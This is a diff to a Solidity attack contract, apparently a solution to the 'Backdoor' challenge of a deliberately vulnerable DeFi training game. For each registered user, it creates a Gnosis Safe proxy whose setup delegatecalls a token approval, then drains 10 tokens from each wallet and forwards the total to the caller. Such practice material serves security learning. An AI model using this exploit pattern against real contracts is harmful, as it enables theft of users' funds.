@@ -13,7 +13,7 @@ import "hardhat/console.sol";
 contract AttackBackdoor {
     DamnValuableToken token;
     WalletRegistry registry;
-    GnosisSafe masterCopy;
+    address masterCopy;
     GnosisSafeProxyFactory proxyCreation;
 
     constructor(
@@ -24,7 +24,7 @@ contract AttackBackdoor {
     ) {
         token = DamnValuableToken(_token);
         registry = WalletRegistry(_registry);
-        masterCopy = GnosisSafe(payable(_wallet));
+        masterCopy = _wallet;
         proxyCreation = GnosisSafeProxyFactory(_proxyCreation);
     }
 
@@ -34,14 +34,16 @@ contract AttackBackdoor {
 
     function attack(address[] calldata _users) public {
         for (uint256 i = 0; i < _users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = _users[i];
             bytes memory encodeApprove = abi.encodeWithSignature(
-                "token.approve(address,address)",
+                "approve(address,address)",
                 address(this),
                 address(token)
             );
             bytes memory initialiser = abi.encodeWithSignature(
                 "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-                [_users[i]],
+                owners,
                 1,
                 address(this),
                 encodeApprove,
@@ -51,14 +53,15 @@ contract AttackBackdoor {
                 0
             );
             GnosisSafeProxy proxy = proxyCreation.createProxyWithCallback(
-                address(masterCopy),
+                masterCopy,
                 initialiser,
                 0,
                 IProxyCreationCallback(address(registry))
             );
 
             token.transferFrom(address(proxy), address(this), 10 ether);
-            console.log(token.balanceOf(address(this)));
+            console.log(token.balanceOf(address(this)) / 1 ether);
         }
+        token.transfer(msg.sender, token.balanceOf(address(this)));
     }
 }
